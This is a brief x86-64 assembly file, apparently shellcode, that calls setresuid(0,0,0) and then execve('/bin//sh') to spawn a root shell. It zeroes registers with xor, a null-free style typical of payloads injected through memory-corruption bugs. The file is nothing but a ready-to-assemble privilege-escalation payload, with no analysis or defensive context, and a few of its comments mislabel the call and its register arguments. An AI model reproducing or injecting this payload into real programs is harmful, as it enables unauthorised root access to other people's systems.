BITS 64

; execve('/bin/sh',argv,envp)
; setresuid(ruid,euid,suid)

; setuid syscall
; syscall number
xor rax,rax
mov al,0x75
; euid=0
xor rdi,rdi
; ruid=0
xor rsi,rsi
; suid=0
xor rdx,rdx
syscall

xor rax,rax
push rax
mov al, 0x3b
mov rdi, 0x68732f2f6e69622f
push rdi
mov rdi,rsp
xor rsi, rsi
xor rdx, rdx
syscall
